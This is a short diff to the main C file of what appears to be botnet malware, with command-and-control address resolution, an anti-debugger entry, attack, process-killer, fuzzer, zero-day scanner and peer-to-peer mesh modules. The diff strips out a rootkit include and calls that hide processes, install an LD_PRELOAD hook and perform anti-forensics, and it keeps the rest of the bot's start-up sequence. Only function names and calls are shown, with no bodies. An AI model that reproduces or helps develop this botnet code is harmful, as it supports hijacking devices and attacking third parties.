@@ -35,7 +35,6 @@
 #include "attack_stats.h"
 #include "fuzzer.h"
 #include "p2p_mesh.h"
-#include "rootkit.h"
 #include "cnc_report.h"
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -195,10 +194,6 @@ int main(int argc, char **args)
     table_lock_val(TABLE_EXEC_SUCCESS);
     attack_init();
     killer_init();
-    rootkit_init();
-    rootkit_hide_process();
-    rootkit_install_ldpreload();
-    rootkit_anti_forensics();
     fuzzer_init();
     zeroday_scanner_init();
     p2p_mesh_init();
